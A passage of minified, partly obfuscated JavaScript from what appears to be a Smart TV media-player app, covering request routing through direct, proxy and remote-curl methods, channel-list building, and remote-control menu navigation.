if(maJor.platform()=="android-device"&&maJor.build>=7){c.hasandroid=1;if(!c.defMethod){if(nd==-1)nd=c.method.length-1;c.method.splice((i+1),0,"android")}}else c.method=arrDelValue(c.method,"android");c.mobile=1;c.retry=0;if(ccount==null){lastUrl={};c.count=0}else c.count=ccount+1;c.hidden=0;c.parent=parent;c.postdata="";c.atime=maJor.params.get("timeoutiptv")*1000||20000;c.addheaders={};c.fulllink="";c.mwtn=0;c.canceled=0;c.xhr=null;c.xhr2=null;c.xhr4=null;c.waitcnum=1;c.waitc={"start":!1,"mode":null,"timer":null,"cmd":"","xml_url":"","l011I01O1oFNkOQlOIYpr":"","sel":0,"orig_xml_url":"","data_parse":"","lOQI0lGOTlOII0Ypr":null}}catch(e){jsshowErr("uOpenClass "+e.message)}
return c},setMaxTime:function(n){this.atime=n*1000;return this},addh:function(h){this.addheaders=h;return this},hid:function(){this.hidden=1;return this},is_remote:function(){if(maJor.params.get("remote")==0||!maJor.params.get("remoteactive"))return 0;else return 1},init:function(){if(this.request_id==null)this.request_id=kjtYpr.REQUEST_ID;if(this.mobile=1)this.ua=window.navigator.userAgent;else this.ua=ua_chrome},showbar:function(s){if(!this.hidden||s=="off"){if(s.match(/^https?%/))s=decodeURIComponent(s);maJor.statusbar(s,"link")}},is_cancel:function(p){var c=p||this;return c.canceled||(c.parent&&c.is_cancel(c.parent))},abort:function(){var c=this;if(window.vPlayer&&!vPlayer.minimize&&$_("player")&&$_("player").style.display=="block")vPlayer.lll0Q10I0lI1O0Oll0OOYpr();c.canceled=1;clearTimeout(c.fastremote_timer);if(c.xhr!=null)c.xhr.abort();if(c.xhr2!=null)c.xhr2.abort();if(c.xhr4!=null)c.xhr4.abort();if(!c.hidden)c.showbar("off")},sendrparse:function(data,s){var c=this;var uh=uHelper.create("directnoheader|rf|proxy",c.count,c);uh.parse=function(s){if(c.is_cancel()){c.parse("Your aborted loaded page")}else c.parse(s)}
var u="";if(typeof data.async=="object"){if(gV(data.async,"post")!=""){u=data.async.post.replace("%s",encodeURIComponent(s))}}
if(u=="")u=sU(c.postlink||c.fulllink,"#POSTparse["+encodeURIComponent(data.parse)+"]="+encodeURIComponent(s));if(gV(data,"data")!="")u=sU(u,"#POST"+data.data);return uh.getI(u)},preparse:function(s){var c=this;if(c.is_cancel()){return}
lastUrl[c.method[c.retry]+c.fulllink]=s;if(c.count>15){if(!c.hidden)maJor.statusbar("Error. Many redirect parse "+c.fulllink);c.abort()}else if(s!=null){if(s.indexOf('{"confirm')==0){c.abort();var dm=gP("lO10111O0001lOl00Ypr").match(rCook);var data=lIlI1VBOOlI01QYpr(s);var ttl=gV(data.confirm,"title");if(dm!=null)ttl="<div style='font-weight: bold;background: #3b3e40;'>"+dm[3]+"</div>"+ttl;var confm=confirmed.create(ttl);if(data.confirm.channel){confm.fun=[function(){Il01QllQll().navigate(data.confirm.channel)}]}
return}else if(s.indexOf('{"error"')==0){kjtYpr.inf(lIlI1VBOOlI01QYpr(s)["error"],2000);c.abort();is_loadpage(0);return}else if(s.indexOf('{"notify"')==0){kjtYpr.inf(lIlI1VBOOlI01QYpr(s)["notify"],2000);c.abort();is_loadpage(0);return}else if(s.indexOf("{")==0&&(s.indexOf('{"parse":"')==0||s.indexOf('"async"')>0)){var data=lIlI1VBOOlI01QYpr(s);if(data&&data.parse){data.c=c;if(data.fastremote&&typeof data.async=="object"){if(gV(data.async,"send")!=""&&gV(data.async,"get")!=""){return c.fastremote(data)}}else if(gV(data,"cors")=="js"){$.ajax({url:data.parse,type:'GET',dataType:'jsonp',}).done(function(res){var s=l1OOl0I0IASY10lQ10Ypr(res)||res;c.sendrparse(data,s)});return c}else{if(gV(data,"cors")=="local"){c.xhr2=uHelper.create("directnoheader",c.count,c)}else if(gV(data,"cors")){c.xhr2=uHelper.create(data.cors,c.count,c)}else if(maJor.app_cors)c.xhr2=uHelper.create("directnoheader|rf",c.count,c);else c.xhr2=uHelper.create("rf|xml",c.count,c);data.callback=c.xhr2.parse=function(s){if(c.is_cancel())c.parse(null);else if(typeof data.async=="object"&&0)c.preparse(s);else c.sendrparse(data,s)}
c.showbar(data.parse,"link");c.xhr2.get(data.parse,data);return c}}}}
c.parse(s)},parse:function(){},umwt:function(data){var c=this;if(c.is_cancel())return;c.xhr4=null;c.xhr4=new XMLHttpRequest();c.xhr4.onreadystatechange=function(){if(c.xhr4.readyState==4){if(c.xhr4.status==200&&c.xhr4.responseText!="wait"&&c.xhr4.responseText!=""){if(c.is_cancel())return;if(data.parsedata)data.parsedata.callback(c.xhr4.responseText);else c.sendrparse(data,c.xhr4.responseText)}else{c.mwtn++;if(c.mwtn<5)c.fastremote_timer=setTimeout(function(){c.umwt(data)},4000);else{c.abort();if(!Il01QllQll().is_ifr()){vPlayer.lll0Q10I0lI1O0Oll0OOYpr(!0);if(!c.hidden)kjtYpr.popUp("Истекло время ожидания получения ссылки! Попробуйте позже или включите RemoteFork для более быстрой обработки ссылок",2500)}
c.parse()}}}};c.xhr4.open('GET',data.async.get,!0);c.xhr4.send()},fastremote:function(data){var c=this;if(c.is_cancel())return;var u=data.async.send;var d=u.match(/..*?(http.*?)("|$)/);if(d!=null)c.showbar(d[1],"fulllink");c.xhr2=null;c.xhr2=new XMLHttpRequest();c.xhr2.onreadystatechange=function(){if(c.xhr2.readyState==4){if(c.xhr2.responseText==""){if(!c.hidden)kjtYpr.popUp("Ошибка self парсинга! Включите RemoteFork для более быстрой обработки ссылок "+url+"!",2500);return c.parse("")}
if(c.is_cancel())return;if(c.xhr2.status==200){c.mwtn=0;c.fastremote_timer=setTimeout(function(){c.umwt(data)},4000)}else{c.xhr2=null;if(!c.hidden)kjtYpr.popUp("Истекло время ожидания получения ссылки! Включите RemoteFork для более быстрой обработки ссылок "+url+"!",2500)}}};c.xhr2.open('GET',u,!0);c.xhr2.send()},b64DecodeUnicode:function(str){str=gVs(str).replace(/\n/g,"");str=atob(str);return decodeURIComponent(str.split('').map(function(c){return'%'+('00'+c.charCodeAt(0).toString(16)).slice(-2)}).join(''))},waitresponse:function(o){var c=this;if(c.is_cancel()){return}
o.response=c.b64DecodeUnicode(gV(o,"response"));if(c.withHeaders)o.response=c.b64DecodeUnicode(gV(o,"headers"))+"\n\n"+o.response;if(gV(o,"status")=="ok"){c.preparse(o.response)}else{c.preparse(o.response)}},waitcurl:function(url){var c=this;if(maJor.build>=7){if(url=="abort"){if(waitc[c.request_id]){waitc.start=0;waitc[c.request_id]=null}
return}
waitc[c.request_id]=this;if(url.indexOf("curl")==0){waitc[c.request_id].withHeaders=(url.indexOf(" -i ")>0);var g=parseCURL(url)}else g={"method":"GET","url":url,"header":{}};andr.parsecurl(l1OOl0I0IASY10lQ10Ypr(g),c.request_id)}else kjtYpr.inf("Update ForkNewBeta.apk for use request to "+url,1500);return c},getArand:function(r){var t=0,cur=0;for(var i in r)t+=r[i];rndWeight=Math.floor(Math.random()*t);for(var i in r){cur+=r[i];if(cur>=rndWeight)return i}},rCurl:{"":25,"2":40,"3":15,"4":15},getcu:function(u){return"http://exec"+gV(u)+".remotecurl.appfxml.com/curl/command/?uri="},getDefCurl:function(){var c=this;if(document.location.href.indexOf("sub_server=")>0)maJor.params.set("serv",document.location.href.substr(document.location.href.indexOf("sub_server=")+11).split("#")[0]);if(gV(maJor.params.get("serv"))!=""){maJor.params.set("serv",parseInt(maJor.params.get("serv")));var x=0;for(var i in c.rCurl){if(x==maJor.params.get("serv"))return i;x++}}
return null},settime:function(s){var offset=new Date().getTimezoneOffset();if(gV(s).indexOf("=")!=-1){T.timestamp=Number(s.split("=")[1]);if(gV(s.split("="),2)!="")ipG=s.split("=")[2]}else T.timestamp=0;var timesec=T.timestamp*1000+offset*60000;if(!isNaN(timesec)&&timesec>16000000000){T.inetTime=Math.ceil(timesec)}else{T.inetTime=Date.now()+offset*60000}
clearInterval(kjtYpr.IntervalUpdateTime);kjtYpr.IntervalUpdateTime=setInterval(function(){SetTimeDate()},1000)},l1lIl01dcvO111IIYpr:function(n){var c=this;n=gV(n);xhrl["p"+n]=uHelper.create("directnoheader");xhrl["p"+n].hidden=1;xhrl["p"+n].parse=function(s){if(!prload){c.settime(s);prload=1;rcurlUrl=c.getcu(n);for(var i in c.rCurl){if(i!=n&&xhrl["p"+i]!=null)xhrl["p"+i].abort()}}}
xhrl["p"+n].get(c.getcu(n)+"ping")},xhrDef:null,updateDef:function(){var c=this;if(gV(cached,"start")==""){uHelper.create("directnoheader|rf|proxy").hid().get("http://komivp.github.appfxml.com/index.js").parse=function(s){cached.start=s}}
c.updateGrid()},updateGrid:function(){var c=this;if(!c.xhrDef&&maJor.getId()){c.xhrDef=uHelper.create("directnoheader").hid().getI("http://cloudflare.appfxml.com/browseraccount/?do=grid").parse=function(s){if(!userGrid)var rel=1;else rel=0;userGrid=lIlI1VBOOlI01QYpr(gV(s));if(userGrid){if(l0OII100kdNdQl01lYpr()&&handler=="menu"&&rel)Il01QllQll().reload()}
uHelper.xhrDef=null}}},updateCurl:function(){var c=this,tt=40;if(rcurlUrl==""){prload=0;var se=[];var tmp=lIlI1VBOOlI01QYpr(l1OOl0I0IASY10lQ10Ypr(c.rCurl));for(var i in c.rCurl){var n=c.getArand(tmp);se.push(n);delete tmp[n];setTimeout("if(!prload) uHelper.create('directnoheader').l1lIl01dcvO111IIYpr("+n+");",tt);tt+=1000}}else{c.xhr=uHelper.create("direct");c.xhr.hidden=1;c.xhr.parse=function(s){if(gV(s).indexOf("OK")==-1){rcurlUrl="";c.updateCurl()}else{if(gV(s).indexOf("=")!=-1)c.settime(s);c.updateDef()}}
c.xhr.get(rcurlUrl+"ping")}},curlUrl:function(){var c=this;if(rcurlUrl!="")return rcurlUrl;else{var u=c.getDefCurl();if(u==null)u=c.getArand(c.rCurl);return c.getcu(u)}},getI:function(u,parsedata){return this.get(maJor.addident(u),parsedata)},get:function(u,parsedata){var c=this;try{c.init();c.fulllink=u;if(u.indexOf("//")===0)u="http:"+u;if(u.indexOf("http://remotefo.rk/")==0){c.method=["android"]}
if(!c.defMethod&&!c.retry&&u.indexOf("curl")==0&&maJor.platform()=="android-device"&&maJor.build>=7){c.method=arrDelValue(c.method,"android");c.method.unshift("android")}
var method=c.method[c.retry];if(u.indexOf("usb://")==0){if(maJor.platform()=="tizen")TUsbList(u.substr(5),c);else if(maJor.platform()=="maple"){if(u=="usb://")ScanUsbPort(c);else getUsbList(u.substring(6),c)}else{kjtYpr.inf("Only for Tizen and Samsung maple api",1200);c.parse()}
return c}
var url=u;if(url.indexOf("#POST")>0){c.postdata=url.split("#POST")[1];url=url.split("#POST")[0]}
if(is_local(u)&&method.match(/xml|proxy|remote/)){c.retry++;if(c.retry<c.method.length)c.get(u,parsedata);else{if(!c.hidden)kjtYpr.inf("Error stream local parser",1200);c.abort();c.parse()}
return c}
if(gV(lastUrl,method+u+c.postdata)!=""){if(!c.hidden)maJor.statusbar("Error! Many redirects "+u);c.parse(gV(lastUrl,method+u));return c}else lastUrl[method+u]="1";c.showbar(getNavU(url),"link");xhr_abort=!1;if(u.indexOf("curl")==0)var lc=u;else lc='curl -L "'+url+'" -H "Accept-Language: ru,en;q=0.8,uk;q=0.6,bg;q=0.4" -H "User-Agent: '+c.ua+'" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"';c.hasheaders=0;for(var i in c.addheaders){c.hasheaders=1;lc+=' -H "'+i+': '+c.addheaders[i]+'"'}
if(c.postdata!==""){lc+=' -H "Content-Type: application/x-www-form-urlencoded" --data "'+c.postdata+'"'}
switch(method){case "rf":url="http://"+maJor.params.get("remoteip")+"/parserlink?"+encodeURIComponent(lc.replace(/\|/g,"-.-"));break;case "proxy":serv=["148.72.155.49","94.130.19.47"];var x=randomInt(0,serv.length-1);url="http://"+serv[x]+"/xhr.php?u="+encodeURIComponent(lc);c.postlink=url;break;case "xml":url=c.curlUrl()+encodeURIComponent(url);c.postlink=url;url+=maJor.addident();break;case "remote":var d={"async":{"send":prxremote+"?do=xhrremote2&u="+encodeURIComponent(url)+"&vp="+maJor.timestamp+"&time=7200&use_remote=|curl_androind|curl_windows|android-device|&use_country=&v=send&direct","get":prxremote+"?do=xhrremote2&v=wget&hash="+md5(url),"post":""}}
if(typeof parsedata=="object"){d.parsedata=parsedata;if(gV(parsedata.async,"post")!="")d.async.post=gV(parsedata.async,"post");if(gV(parsedata,"data")!="")d.data=gV(parsedata,"data")}
c.fastremote(d);return c;case "direct":if(c.hasheaders&&maJor.build>=7&&c.postdata=="")return c.waitcurl(lc);break;case "android":return c.waitcurl(lc)}
c.xhr=new XMLHttpRequest();c.xhr.onreadystatechange=function(){if(c.xhr.readyState==4){clearTimeout(c.lIIO1IIcvlI00O1Ypr);c.status=c.xhr.status;if(c.is_cancel())return;if(u.indexOf("/")==0)return c.preparse(c.xhr.responseText);else if(c.xhr.status!=200&&c.xhr.status!=302){if(method.indexOf("direct")==0){if(c.xhr.status>0||(is_local(u)&&maJor.app_cors)){if(!c.hidden)maJor.statusbar("<b>Error:</b> "+c.xhr.status+" "+u);return c.parse(null)}}
c.retry++;if(c.retry<c.method.length){return c.get(u,parsedata)}else{if(!c.hidden){is_loadpage(0);maJor.statusbar("Error stream parser network "+u)}
return c.parse(null)}}
c.preparse(c.xhr.responseText)}};if(method.match(/rf|proxy|xml/)){c.xhr.open('GET',url,!0);c.xhr.send()}else if(u.indexOf("curl")==0){var curl=parseCURL(u);if(curl.method=="POST"){c.xhr.open('POST',curl.url,!0);if(method=="direct"){for(var p in curl.header){if(p!="Content-Type")c.xhr.setRequestHeader(p,curl.header[p])}}
if(curl.body)c.xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded; charset=UTF-8');c.xhr.send(curl.body)}else if(curl.method=="HEAD"){c.xhr.open('HEAD',curl.url,!0);if(method=="direct"){for(var p in curl.header)c.xhr.setRequestHeader(p,curl.header[p]);}
c.xhr.send()}else{c.xhr.open("GET",curl.url,!0);if(method=="direct"){for(var p in curl.header)c.xhr.setRequestHeader(p,curl.header[p]);}
c.xhr.send()}}else{var base64String=null;try{var matches=url.match(/^(https?:\/\/)([^:\/]+):([^@\/]+)@/);if(matches){var userColonPassword=matches[2]+':'+matches[3];var base64String=btoa(userColonPassword);url=url.replace(matches[0],matches[1])}}catch(e){jsshowErr("Error addBasicAuthHeader "+e.message,-1)}
if(c.postdata!=="")c.xhr.open('POST',url,!0);else c.xhr.open('GET',url,!0);if(base64String)c.xhr.setRequestHeader('Authorization','Basic '+base64String);if(maJor.series!="D"&&maJor.series!="C"&&maJor.app_cors&&xhr_referer==3&&method!="directnoheader"){c.xhr.setRequestHeader("User-Agent",c.ua);c.xhr.setRequestHeader("Accept","*/*");c.xhr.setRequestHeader("Accept-Encoding","deflate")}
if(method=="direct"){for(var i in c.addheaders)try{c.xhr.setRequestHeader(i,c.addheaders[i])}catch(e){}}
if(c.postdata!==""){c.xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');c.xhr.send(c.postdata)}else c.xhr.send()}
c.lIIO1IIcvlI00O1Ypr=setTimeout(function(){if(!c.is_cancel()){xhr_abort=!0;c.xhr.abort();if(!c.hidden){kjtYpr.inf('_FPPrevLimOzh_',1500,'yellow')}}},c.atime)}catch(e){setTimeout(function(){c.parse(null)},50);if(!c.hidden){is_loadpage(0);maJor.statusbar("Error get url "+u)}
jsshowErr("xhr err "+e.message+"-"+u,-1)}
return c},list:[],recurFolder:function(a,ttl,desc){var ttl=gV(ttl);if(ttl!=="")ttl+=" ";for(var j in a){if(j=="title")ttl+=a[j]+" ";else if(j=="file"&&gV(a,"file")!==""){if(gV(a,"poster"))var dop='<img src="'+a.poster+'" style="width:180px;float:left;">';else dop="";if(gV(desc)!=="")dop+=desc+"<br>";this.list.push({"title":ttl,"logo_30x30":gV(a,"poster"),"stream_url":a[j],"description":dop+ttl})}else if(typeof a[j]=="object")this.recurFolder(a[j],ttl,desc)}}};uHelper.create('directnoheader').updateCurl();setInterval("uHelper.create('directnoheader').updateCurl();",1800000);function getSelect(){if(typeof Il01QllQll()!="undefined")return parseInt(Il01QllQll().select);else return 0}
function setSelect(s){if(s=="--")Il01QllQll().select--;else if(s=="++")Il01QllQll().select++;else Il01QllQll().select=parseInt(s);return!0}
function curCh(m,v){return Il01QllQll().curCh(m,v)}
function copyToClipboard(elem){var targetId="_hiddenCopyText_";var isInput=elem.tagName==="INPUT"||elem.tagName==="TEXTAREA";var origSelectionStart,origSelectionEnd;if(isInput){target=elem;origSelectionStart=elem.selectionStart;origSelectionEnd=elem.selectionEnd}else{target=document.getElementById(targetId);if(!target){var target=document.createElement("textarea");target.style.position="absolute";target.style.left="-9999px";target.style.top="0";target.id=targetId;document.getElementsByTagName('body')[0].appendChild(target)}
target.textContent=elem.textContent}
var currentFocus=document.activeElement;target.focus();target.setSelectionRange(0,target.value.length);var succeed;try{succeed=document.execCommand("copy")}catch(e){succeed=!1}
if(currentFocus&&typeof currentFocus.focus==="function"){currentFocus.focus()}
if(isInput){elem.setSelectionRange(origSelectionStart,origSelectionEnd)}else{target.textContent=""}
return succeed}
function exinobj(obj,k){var res=0;maJor.each(obj,function(val){if(k==val)res=1});return res}
function lI0Il1OrlwllI1Ypr(u){var script=document.createElement('script');script.type='text/javascript';script.async=!0;script.src=u;script.onload=function(){};document.getElementsByTagName('head')[0].appendChild(script)}
var kjtYpr={PresearChSelected:-1,no_save:!1,l0I0l0Ql1ZEHWI0IIYpr:"",timeout:15,channels:[],menu:[],global:{},build:0,sdk:0,lO10111O0001lOl00Ypr:"",extmode:!1,muted:!1,rlogo:!0,"Exittrue":0,"inputId":"","hm":"","applyenter":1,"lastSearch":"","defaulted":0,"mac":undefined,popUp:maJor.popUp,inf:maJor.inf};kjtYpr.setDefault=function(m){maJor.GL=maJor.ds();maJor.params.save();if(m)return;maJor.write("glsearch","")};function readSt(getlist){is_readst=!0;var ch=[];try{ch=lIlI1VBOOlI01QYpr(cached.start)["channels"]}catch(e){kjtYpr.popUp("Error get defines list from https://raw.githubusercontent.com/komivp/appinfodl/main/index.js");ch=[]}
if(ch==null)ch=[];ch.unshift({"source":"spider","title":"_FPConfiguring search_","tvg-shift":"98","logo_30x30":_img("_ST_settings.png"),"playlist_url":"cmdSetSearch","description":"cmdSetSearch"});ch.unshift({"source":"spider","title":"_FPHistory_","tvg-shift":"98","logo_30x30":_img("_ST_history.png"),"playlist_url":"about:history","description":"about:history"});ch.unshift({"source":"spider","title":"_FPTop queries_","tvg-shift":"98","logo_30x30":"_ST_search.png","playlist_url":"http://spider.appfxml.com/topsearch"});ch.unshift({"source":"spider","title":"_FPEnter search query or site URL, playlist XML / M3U_ <img width='"+css_w(22)+"' src='"+_img("_ST_search.png")+"' style='float:right;height:"+css_wh(22)+"px;padding-top:3px;'>","tvg-shift":"99","value":"","search_on":"_FPEnter search query or URL_:","logo_30x30":_img("_ST_search.png"),"playlist_url":"searchEngines","description":"search engine","presearch":"http://spider.appfxml.com/omnibox/?type=all"});if(maJor.build>=5.5){ch.push({"source":"service","title":"Local Files & Plugins","tvg-shift":"1","logo_30x30":"_ST_usb.png","playlist_url":"http://remotefo.rk/treeview?host=remotefo.rk/","description":"http://127.0.0.1/treeview"})}else if(maJor.build>=5.1){ch.push({"source":"service","title":"Ace stream torrent plugins","logo_30x30":"_ST_ace_stream.png","playlist_url":"http://remotefo.rk/treeview?pluginacetorrentplay/.xml&host=remotefo.rk/","description":"forkplayer://pluginacetorrentplay/"})}
if(maJor.params.get("remote")>0||maJor.params.get("acestream")!="")ch.push({"source":"service","title":"Torrent сайты","logo_30x30":"_ST_ace_stream.png","local":2,"mb_parser":"http://ACE_IP:6878/webui/api/service?method=get_version&format=jsonp&callback=mycallback","menu_url":"1080|remotefork|rfs","playlist_url":"http://parsers.appfxml.com/torrentsites/?as=md5mbhash","description":"http://parsers.appfxml.com/torrentsites/"});if(maJor.params.get("remote")>0){ch.push({"source":"service","title":"RemoteFork DLNA & Plugins","logo_30x30":"_ST_dlna.png","playlist_url":"forkdlna","description":"forkplayer://RemoteFork/"});ch.push({"source":"service","title":"Home media server","tvg-shift":"1","logo_30x30":"_ST_hms.png","playlist_url":"hms","description":"forkplayer://HMS/"})}
if(maJor.platform()=="tizen"){if(version_local_files>0)ch.push({"source":"service","title":"USB","tvg-shift":"1","logo_30x30":"_ST_usb.png","playlist_url":"usb://","description":"forkplayer://USB/"})}else if(maJor.platform()=="maple"){ch.push({"source":"service","title":"USB<br>_FPPamyatTv_","tvg-shift":"1","logo_30x30":"_ST_usb.png","playlist_url":"usb://","description":"forkplayer://USB/"});ch.push({"source":"service","title":"ForkStore<br> App Market","tvg-shift":"1","logo_30x30":"_ST_fstore.png","playlist_url":"http://obovse.ru/smarttv/wlist.php","description":"http://forkbrowser.top/forkstore"})}else if(maJor.platform()=="tizen")ch.push({"source":"service","title":"ForkStore<br> App Market","tvg-shift":"1","logo_30x30":"_ST_fstore.png","playlist_url":"http://obovse.ru/smarttv/wlist.php?id=apps","description":"http://forkbrowser.top/forkstore"});if(getlist)return ch;for(var z=0;z<ch.length;z++){try{baseurl[ch[z].playlist_url]=ch[z].description}catch(e){}}
return ch;is_readst=!0}
var homeurl=document.location.href;if(homeurl.indexOf("#")!=-1)homeurl=homeurl.substr(0,homeurl.indexOf("#"));var insetActive=0;var insetSelect=0;var icodef="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAXCAYAAADgKtSgAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAZdEVYdFNvZnR3YXJlAHBhaW50Lm5ldCA0LjAuMTnU1rJkAAAB4ElEQVRIS7XUSwhNURQGYO9XhLwfETOlGChKZMDMUGbIQMrEjIGBkQGlKIwkxcDAIySPkUeKUkyEKBMlZkh5f/qzb137nHtR16m/c1p77X/v9a9/nSEY8r/QCAwSjcAg0Qj0wETMwXzMxoSWnAYagS4MxTzsxHk8xDM8wGlsw7SWfX9FvgK38RkvcBbXcBW7y/cVLGnZ25M8Nw7xS/zAJzzHJSzHLIzCVrwrlSxs4WkljxQ38aYQ7sU6LMCwrrxNuI8vRbapNVdNHETjyNG56YyWnCDV7SoyfcCWOqfeEFecwWaswvpCMrzKi8438Ap38RrHMLYfeex2B4sxs5R7DxswsitvD7779eT9DRcxuR95fJwGzcUyvC8Eae7qkpOG7yjN7jz5TiVT+pFnQG5haTkot87G4HGXryPTGuwvF8j6BUzqR57JO4XtGI0DpeTgIEZU+Wvxtqwfxph+5EEm73rRPOTxeYjHVXkdeT4Wt2ysuWriIKVfxpHigBwwvSUvDT6JrziB8XVOvaGDWC2D9LRoW68Hi/CoNDIuq9d7kgcZ6XPlZ7UPK8uU5rBDeILjvYj/RB5kpDN5R4sbMo35gYU8Gjek+BfyDjJ5GZD4OHb7zRW90AgMEo3AINEIDBI/AefjinVi+JO1AAAAAElFTkSuQmCC";var oldinset=null;function page_rs(t){if(t==null)t=$_("page_load");if(t.src.indexOf("stop")>0){Il01QllQll().stop()}else if(t.src.indexOf("reload")>0){Il01QllQll().reload()}}
function is_loadpage(m){if($_("page_load")){if(m!=null){if(m==-1){gPL().cancel();return is_loadpage(0)}
if(m){$_("page_load").src=_img('_ST_page_stop.png');oInset.loader.start()}else{$_('page_load').src=_img('_ST_page_reload.png');oInset.loader.stop()}}else if($_("page_load").src.indexOf("stop")>0)return 1;else return 0}}
function stopLoadPage(){Il01QllQll().stopLoad()}
var sdbar=null,sdbarSel=0;function sidebar_play(){Il01QllQll().navigate(sdbar[sdbarSel])}
function sidebar_show(n){if(n!=null)sdbarSel=n;Il01QllQll().focused()}
function menu_play(){if(gP().menu[menuSel]){if(menuSubSel>=0)Il01QllQll().navigate(gP().menusub[menuSubSel]);else if(gP().menu[menuSel].playlist_url=="submenu"){var menu=$_("menu"+menuSel+"sub");menu.style.visibility="hidden";menu.style.display="block";var right=menu.offsetLeft+menu.offsetWidth;if(right>maJor.screen().w-20){menu.style.left=(maJor.screen().w-menu.offsetWidth-50)+"px"}
gP().menusub=gP().menu[menuSel].submenu;menuSubSel=0;menu.style.visibility="visible";menu_sel()}else Il01QllQll().navigate(gP().menu[menuSel])}}
function menu_hideSub(n){menuSubSel=-2;if(gP().menu.length<1)return;if(n==null){for(var i=0;i<gP().menu.length;i++)if($_("menu"+i+"sub")!=null)$_("menu"+i+"sub").style.display="none"}else if($_("menu"+n+"sub")!=null)$_("menu"+n+"sub").style.display="none"}
function menu_sel(){try{if(gP()!=null){if(!gP().menu.length||!$_("menu0"))return
if(menuSubSel>-2){if(menuSubSel<0)menuSubSel=gP().menusub.length-1;else if(menuSubSel>gP().menusub.length-1)menuSubSel=0;for(var i=0;i<gP().menusub.length;i++){if(i==menuSubSel&&getSelect()==-3){$_("menu"+menuSel+"sub"+i).className=$_("menu"+menuSel+"sub"+i).className.replace(/default/g,"selected");Il01QllQll().hint()}else{$_("menu"+menuSel+"sub"+i).className=$_("menu"+menuSel+"sub"+i).className.replace(/selected/g,"default")}}
tocroll($_("menu"+menuSel+"sub"),$_("menu"+menuSel+"sub"+menuSubSel))}
if(menuSel>gP().menu.length-1)menuSel=0;else if(menuSel<0)menuSel=gP().menu.length-1;for(var i=0;i<gP().menu.length;i++){if($_("menu"+i)){if(i==menuSel&&getSelect()==-3&&menuSubSel<0){$_("menu"+i).className=$_("menu"+i).className.replace(/default/g,"selected");Il01QllQll().hint()}else{$_("menu"+i).className=$_("menu"+i).className.replace(/selected/g,"default")}}}}}catch(e){kjtYpr.popUp("Err menu: "+e.toString(),1800)}}
function sidebar_sel(){if(maJor.params.get("sidebar")!="1")return
if(sdbarSel>sdbar.length-1)sdbarSel=0;else if(sdbarSel<0)sdbarSel=sdbar.length-1;for(var i=0;i<sdbar.length;i++){if($_("sdbar"+i)!=null){if(i==sdbarSel&&getSelect()==-2)$_("sdbar"+i).style.border="2px solid rgb(85, 144, 231)";else $_("sdbar"+i).style.border="2px solid transparent"}}}
var lastResel="";function reselAll(n){if(n!=null)setSelect(n);var hsh=getSelect()+" "+menuSel+" "+menuSubSel+" "+sdbarSel;if(lastResel!=hsh){oInset.listInset();menu_sel();sidebar_sel();oInset.omniSel()}
lastResel=hsh}
function osetPos(x,y,z){var s=getSelect();if(x==0){if(y==-1){if(s==-4)setSelect(-1);else if(s==-3){if(menuSubSel==-2){if(maJor.params.get("sidebar")=="1")setSelect(-2);else setSelect(-4)}else{return menu_sel(--menuSubSel)}}else if(s==-2)setSelect(-4);else{var row=-1;if(s>=0){if(gP()==null){row=0}else if(typeof gP().sPos[s]=="undefined")row=0;else row=gP().sPos[s][1];if(row==0){if(gP()!=null&&gP().menu.length)setSelect(-3);else if(maJor.params.get("sidebar")=="1")setSelect(-2);else setSelect(-4)}}
if(gP()!=null&&row!=0)return Il01QllQll().posStart(0,-1)}}
if(y==1){if(s==-1)setSelect(-4);else if(s==-4){if(maJor.params.get("sidebar")=="1")setSelect(-2);else if(typeof gP()=="undefined")setSelect(-1);else if(gP().menu.length)setSelect(-3);else setSelect(0)}else if(s==-3){if(menuSubSel==-2)setSelect(0);else{return menu_sel(++menuSubSel)}}else if(s==-2&&gP().menu.length)setSelect(-3);else if(s==-2)setSelect(0);else{return Il01QllQll().posStart(0,1)}}
linkOver()}
if(y==0){if(x==1){if(s==-4){return oInset.omniSel("+")}else if(s==-3){menu_hideSub();return menu_sel(++menuSel)}else if(s==-2)return sidebar_show(++sdbarSel);else if(s==-1){oInset.listInset(++insetSelect);Il01QllQll().hint();return}
Il01QllQll().posStart(1,0)}
if(x==-1){var page=gP();if(s==-4){return oInset.omniSel("-")}else if(s==-3){menu_hideSub();if(!z&&menuSel==0&&page&&page.aside_exist())return page.aside_open();return menu_sel(--menuSel)}else if(s==-2)return sidebar_show(--sdbarSel);else if(s==-1){oInset.listInset(--insetSelect);Il01QllQll().hint();return}
if(!z&&page.aside_exist()){if(s>=0&&page&&gP().sPos&&gP().sPos[s]&&gP().sPos[s][0]===0)return page.aside_open()}
Il01QllQll().posStart(-1,0)}}
if(gP()==null)reselAll()}
var rates={};function t_s(t,index){if(index!=null&&getSelect()!=index)Il01QllQll().focused(index,t);kjtYpr.long_t=1;kjtYpr.t_timer=setTimeout('kjtYpr.long_t=0;ContextMenu.show();',1200)}
function t_e(){if(kjtYpr.long_t){kjtYpr.long_t=0;clearTimeout(kjtYpr.t_timer)}}
function p_d(t,index){if(index!=null&&getSelect()!=index)Il01QllQll().focused(index,t);kjtYpr.long_left=!1;kjtYpr.long_timer=setTimeout('kjtYpr.long_left=true;ContextMenu.show();',700)}
function p_u(){clearTimeout(kjtYpr.long_timer)}
function p_c(ind){if(handler=="context")return;if(!kjtYpr.long_left)Il01QllQll().play(ind);kjtYpr.long_left=!1}
function l0OI1uul1IllYpr(){return}
function set_times(mode){if(l0OII100kdNdQl01lYpr()||!maJor.ftimes||!gP())return;for(var i=0;i<gP("channels").length;i++){if(gV(gP("channels")[i],"stream_url")){if($_("titleid"+i)){if(maJor.ftimes[getIdent(i)])$_("titleid"+i).style.textDecoration="line-through";else if(mode)$_("titleid"+i).style.textDecoration=""}
if(allTimes[getIdent(i)]&&$_("numch"+i)){if(allTimes[getIdent(i)].d!=kjtYpr.hardware+" ("+maJor.getId()+")"){$_("numch"+i).style.textDecoration="underline"}else $_("numch"+i).style.textDecoration=""}}}}
